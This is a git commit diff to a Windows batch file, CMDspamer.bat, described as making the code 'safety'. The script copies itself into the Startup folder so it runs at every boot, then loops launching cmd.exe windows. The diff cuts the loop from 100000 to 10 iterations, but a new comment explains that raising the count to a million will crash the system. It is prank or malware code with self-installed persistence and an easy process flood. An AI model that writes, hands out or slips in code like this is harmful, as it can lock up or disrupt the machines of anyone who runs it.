a9d08cb624f14392d5073b2ec20203dc84f1da75
KostebelovArtyom <106486593+KostebelovArtyom@users.noreply.github.com>
2025-05-13 02:49:42 +0300

    made code safety CMDspamer.bat

--- CMDspamer.bat
+++ CMDspamer.bat
@@ -3,5 +3,5 @@
 :: copies the full path to this script to dir startup to automatically run this batch file when Windows starts
 copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 :: run loop that start cmd.exe; syntax: for - loop, /L - work with arithmetical(numbers), %%i - var-counter (if u use cmd, u write "%i", but in batch file need use "%%i")
-:: in (start, step(increment/decremet), stop), do (start program) - every circle of the loop do run specified program
-for /L %%i in (1,1,100000) do (start cmd.exe)
+:: in (start, step(increment/decremet), stop) if u wanna shutdown ur system - up values to 1kk, do (start program) - every circle of the loop do run specified program
+for /L %%i in (1,1,10) do (start cmd.exe)
